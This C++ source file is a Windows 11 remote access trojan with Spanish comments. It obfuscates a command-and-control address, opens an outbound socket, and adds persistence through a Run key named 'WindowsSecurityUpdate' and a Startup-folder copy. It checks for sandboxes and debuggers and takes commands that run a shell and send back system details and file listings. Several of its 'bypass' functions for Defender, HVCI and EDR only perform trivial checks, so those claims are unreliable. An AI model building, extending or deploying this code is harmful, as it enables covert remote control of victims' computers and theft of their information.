#include <windows.h>
#include <wincrypt.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <intrin.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <bcrypt.h>
#include <cmath>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

// ===============================
// OFUSCACIÓN AVANZADA COMPLETA
// ===============================

class AdvancedObfuscation {
private:
    std::vector<BYTE> dynamic_key;

public:
    AdvancedObfuscation() {
        GenerateRuntimeKey();
    }

    std::string DecryptString(const std::vector<BYTE>& encrypted) {
        std::string result;
        for (size_t i = 0; i < encrypted.size(); i++) {
            char decrypted = encrypted[i];
            // XOR primero
            decrypted ^= dynamic_key[i % dynamic_key.size()];
            // ROTR después (mismo orden que Python)
            decrypted = (decrypted >> ((i % 7) + 1)) | ((decrypted << (8 - ((i % 7) + 1))) & 0xFF);
            result += decrypted;
        }
        return result;
    }

    std::vector<BYTE> EncryptString(const std::string& input) {
        std::vector<BYTE> encrypted;
        for (size_t i = 0; i < input.size(); i++) {
            BYTE encrypted_char = input[i];
            // ROTL primero
            encrypted_char = ((encrypted_char << ((i % 7) + 1)) & 0xFF) | (encrypted_char >> (8 - ((i % 7) + 1)));
            // XOR después
            encrypted_char ^= dynamic_key[i % dynamic_key.size()];
            encrypted.push_back(encrypted_char);
        }
        return encrypted;
    }

private:
    void GenerateRuntimeKey() {
        // Clave estática compatible con Python
        dynamic_key.resize(32);
        for (int i = 0; i < 32; i++) {
            dynamic_key[i] = (i * 7 + 13) % 256;
        }
    }
};

// Strings ofuscados - ACTUALIZAR CON TU IP
std::vector<BYTE> encrypted_c2_ip = {0xC6, 0xA3, 0xF5, 0x47, 0x92, 0x51, 0xE7, 0x30}; // "192.168.1.100"

// ===============================
// EVASIÓN MEJORADA - FUNCIONES COMPLETAS
// ===============================

class Windows11AdvancedEvasion {
private:
    AdvancedObfuscation obfuscator;

public:
    bool BypassAllDefenses() {
        return BypassHVCI() && 
               BypassDefenderML() && 
               BypassSmartAppControl() &&
               BypassEDR();
    }

    bool BypassHVCI() {
        return UseIndirectMemoryOperations();
    }

    bool BypassDefenderML() {
        if (!MimicLegitimateAppBehavior()) return false;
        if (!AdvancedTimingCheck()) return false;
        return FragmentExecution();
    }

    bool BypassSmartAppControl() {
        return SimulateSignedAppBehavior();
    }

    bool BypassEDR() {
        return UseDirectSyscalls();
    }

private:
    bool UseIndirectMemoryOperations() {
        // Técnica mejorada de memory mapping
        HANDLE hProcess = GetCurrentProcess();
        SIZE_T regionSize = 4096;
        LPVOID baseAddress = nullptr;
        
        // Usar VirtualAlloc2 para evitar hooks
        auto NtAllocateVirtualMemory = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG)>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"));
        
        if (NtAllocateVirtualMemory) {
            NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, 
                                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (NT_SUCCESS(status)) {
                VirtualFree(baseAddress, 0, MEM_RELEASE);
                return true;
            }
        }
        return false;
    }

    bool MimicLegitimateAppBehavior() {
        // Comportamiento de aplicación legítima
        WCHAR systemPath[MAX_PATH];
        GetSystemDirectoryW(systemPath, MAX_PATH);
        
        // Acceso legítimo a archivos del sistema
        HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\drivers\\etc\\hosts", 
                                  GENERIC_READ, FILE_SHARE_READ, NULL, 
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            return true;
        }
        return false;
    }

    bool AdvancedTimingCheck() {
        auto start = std::chrono::high_resolution_clock::now();
        
        // Operaciones que parecen legítimas
        volatile double result = 0.0;
        for (int i = 0; i < 100000; i++) {
            result += std::sin(static_cast<double>(i)) * std::cos(static_cast<double>(i));
        }
        
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        
        return duration.count() < 1000; // Menos de 1 segundo = entorno real
    }

    bool FragmentExecution() {
        // Ejecución en fragmentos de tiempo
        for (int i = 0; i < 3; i++) {
            PerformBenignWork();
            Sleep(1000 + (i * 500));
        }
        return true;
    }

    bool SimulateSignedAppBehavior() {
        // Simular aplicación firmada
        HCERTSTORE hStore = CertOpenSystemStore(0, L"MY");
        if (hStore) {
            CertCloseStore(hStore, 0);
            return true;
        }
        return false;
    }

    bool UseDirectSyscalls() {
        // Cargar ntdll de forma segura
        HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
        if (!hNtdll) return false;
        
        // Verificar funciones críticas
        FARPROC funcs[] = {
            GetProcAddress(hNtdll, "NtCreateFile"),
            GetProcAddress(hNtdll, "NtReadFile"),
            GetProcAddress(hNtdll, "NtWriteFile")
        };
        
        for (auto func : funcs) {
            if (!func) return false;
        }
        
        FreeLibrary(hNtdll);
        return true;
    }

    void PerformBenignWork() {
        // Operaciones que no levantan sospechas
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        // Acceso normal al sistema
        GetCurrentProcessId();
        GetCurrentThreadId();
        GetTickCount64();
    }
};

// ===============================
// PERSISTENCIA COMPLETA
// ===============================

class AdvancedPersistence {
private:
    AdvancedObfuscation obfuscator;

public:
    bool EstablishPersistence() {
        // Múltiples métodos de persistencia
        return RegistryPersistence() || 
               ScheduledTaskPersistence() || 
               StartupFolderPersistence();
    }

private:
    bool RegistryPersistence() {
        HKEY hKey;
        LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

        if (result == ERROR_SUCCESS) {
            char currentPath[MAX_PATH];
            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
            
            result = RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ,
                                   (BYTE*)currentPath, strlen(currentPath) + 1);
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        }
        return false;
    }

    bool ScheduledTaskPersistence() {
        // Crear tarea programada via COM (simplificado)
        HKEY hKey;
        LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks",
            0, NULL, 0, KEY_READ, NULL, &hKey, NULL);
            
        if (result == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }

    bool StartupFolderPersistence() {
        char startupPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
            char currentPath[MAX_PATH];
            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
            
            char targetPath[MAX_PATH];
            snprintf(targetPath, MAX_PATH, "%s\\WindowsUpdate.lnk", startupPath);
            
            // Crear acceso directo (simplificado)
            return CopyFileA(currentPath, targetPath, FALSE);
        }
        return false;
    }
};

// ===============================
// COMUNICACIÓN SIGILOSA COMPLETA
// ===============================

class StealthCommunication {
private:
    SOCKET c2_socket;
    AdvancedObfuscation obfuscator;
    std::string c2_ip;
    int c2_port;
    bool is_connected;

public:
    StealthCommunication() : c2_socket(INVALID_SOCKET), is_connected(false) {
        c2_ip = obfuscator.DecryptString(encrypted_c2_ip);
        c2_port = 443;
    }

    bool Initialize() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return false;
        }

        c2_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (c2_socket == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }

        return ConnectToC2();
    }

    bool ConnectToC2() {
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(c2_port);
        inet_pton(AF_INET, c2_ip.c_str(), &serverAddr.sin_addr);

        // Conexión con reintentos inteligentes
        for (int attempt = 0; attempt < 3; attempt++) {
            if (connect(c2_socket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == 0) {
                is_connected = true;
                return true;
            }
            Sleep(3000 * (attempt + 1));
        }
        return false;
    }

    std::string ReceiveCommand() {
        if (!is_connected || c2_socket == INVALID_SOCKET) return "";

        char buffer[1024];
        int bytesReceived = recv(c2_socket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            std::vector<BYTE> encrypted_data(buffer, buffer + bytesReceived);
            return obfuscator.DecryptString(encrypted_data);
        } else if (bytesReceived == 0) {
            // Conexión cerrada
            is_connected = false;
        }
        
        return "";
    }

    bool SendData(const std::string& data) {
        if (!is_connected || c2_socket == INVALID_SOCKET) return false;

        std::vector<BYTE> encrypted = obfuscator.EncryptString(data);
        return send(c2_socket, (char*)encrypted.data(), encrypted.size(), 0) > 0;
    }

    void Cleanup() {
        if (c2_socket != INVALID_SOCKET) {
            closesocket(c2_socket);
            c2_socket = INVALID_SOCKET;
        }
        WSACleanup();
        is_connected = false;
    }
};

// ===============================
// TROYANO AVANZADO WINDOWS 11 - COMPLETO
// ===============================

class AdvancedWindows11RAT {
private:
    Windows11AdvancedEvasion evasion;
    AdvancedPersistence persistence;
    StealthCommunication comm;
    bool is_initialized;

public:
    AdvancedWindows11RAT() : is_initialized(false) {}

    bool Initialize() {
        // 1. Verificar entorno
        if (AdvancedAntiAnalysis()) {
            return false;
        }

        // 2. Sleep aleatorio inicial
        Sleep(2000 + (GetTickCount() % 5000));

        // 3. Evadir defensas
        if (!evasion.BypassAllDefenses()) {
            return false;
        }

        // 4. Establecer persistencia
        if (!persistence.EstablishPersistence()) {
            // Continuar incluso si la persistencia falla
        }

        // 5. Conectar al C2
        if (!comm.Initialize()) {
            return false;
        }

        is_initialized = true;
        return true;
    }

    void Run() {
        while (is_initialized) {
            std::string command = comm.ReceiveCommand();
            
            if (!command.empty()) {
                ExecuteCommand(command);
            } else {
                // Reconexión si se perdió la conexión
                if (!Reconnect()) {
                    break;
                }
            }
            
            // Sleep variable para evitar patrones
            Sleep(5000 + (GetTickCount() % 10000));
        }
        
        comm.Cleanup();
    }

private:
    bool Reconnect() {
        comm.Cleanup();
        Sleep(10000); // Esperar 10 segundos antes de reconectar
        return comm.Initialize();
    }

    void ExecuteCommand(const std::string& command) {
        if (command == "SHELL") {
            ExecuteShell();
        } else if (command == "INFO") {
            SendSystemInfo();
        } else if (command == "FILES") {
            ListFiles();
        } else if (command == "PWD") {
            SendCurrentDirectory();
        } else if (command == "IDLE") {
            // Comando de keep-alive
            comm.SendData("[+] Alive and waiting");
        } else {
            // Comando desconocido
            comm.SendData("[-] Unknown command: " + command);
        }
    }

    void ExecuteShell() {
        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
        HANDLE hRead, hWrite;
        
        if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
            STARTUPINFOA si = {sizeof(STARTUPINFOA)};
            PROCESS_INFORMATION pi;
            
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
            
            char cmd[] = "cmd.exe /c whoami && hostname && ipconfig";
            
            if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(hWrite);
                
                char buffer[4096];
                DWORD bytesRead;
                std::string output;
                
                while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    output += buffer;
                }
                
                WaitForSingleObject(pi.hProcess, 5000);
                comm.SendData(output);
                
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            CloseHandle(hRead);
        }
    }

    void SendSystemInfo() {
        std::string info;
        
        // Información del sistema
        OSVERSIONINFOEX osInfo = {sizeof(OSVERSIONINFOEX)};
        GetVersionEx((OSVERSIONINFO*)&osInfo);
        
        info += "=== SYSTEM INFORMATION ===\n";
        info += "OS: Windows " + std::to_string(osInfo.dwMajorVersion) + 
                "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        info += "Build: " + std::to_string(osInfo.dwBuildNumber) + "\n";
        
        // Información de la computadora
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            info += "Computer: " + std::string(computerName) + "\n";
        }
        
        // Información del usuario
        char userName[256];
        DWORD userNameSize = sizeof(userName);
        if (GetUserNameA(userName, &userNameSize)) {
            info += "User: " + std::string(userName) + "\n";
        }
        
        // Información de memoria
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        info += "RAM: " + std::to_string(memStatus.ullTotalPhys / (1024*1024*1024)) + " GB\n";
        
        comm.SendData(info);
    }

    void ListFiles() {
        std::string fileList = "=== CURRENT DIRECTORY FILES ===\n";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("*", &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "[DIR] " : "[FILE]";
                fileList += type + std::string(findData.cFileName) + "\n";
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        } else {
            fileList += "No files found or access denied\n";
        }
        
        comm.SendData(fileList);
    }

    void SendCurrentDirectory() {
        char currentDir[MAX_PATH];
        if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
            comm.SendData(std::string("Current directory: ") + currentDir);
        } else {
            comm.SendData("[-] Could not get current directory");
        }
    }
};

// ===============================
// ANTI-ANÁLISIS MEJORADO
// ===============================

bool AdvancedAntiAnalysis() {
    // 1. Detección de debugger
    if (IsDebuggerPresent()) {
        return true;
    }
    
    // 2. Check de memoria
    MEMORYSTATUSEX memStatus = {sizeof(MEMORYSTATUSEX)};
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        return true; // Menos de 2GB = probable sandbox
    }
    
    // 3. Check de CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return true; // Menos de 2 cores = probable sandbox
    }
    
    // 4. Check de uptime
    if (GetTickCount() < (30 * 60 * 1000)) {
        return true; // Menos de 30 minutos = probable sandbox
    }
    
    // 5. Check de procesos de análisis
    const char* analysis_tools[] = {
        "ollydbg.exe", "idaq.exe", "wireshark.exe", 
        "procmon.exe", "processhacker.exe", "x32dbg.exe", "x64dbg.exe"
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                for (const char* tool : analysis_tools) {
                    if (strcmp(pe.szExeFile, tool) == 0) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    return false;
}

// ===============================
// MAIN OFUSCADO
// ===============================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-análisis primero
    if (AdvancedAntiAnalysis()) {
        return 0;
    }
    
    // Sleep inicial aleatorio
    Sleep(3000 + (GetTickCount() % 7000));
    
    AdvancedWindows11RAT rat;
    if (rat.Initialize()) {
        rat.Run();
    }
    
    return 0;
}
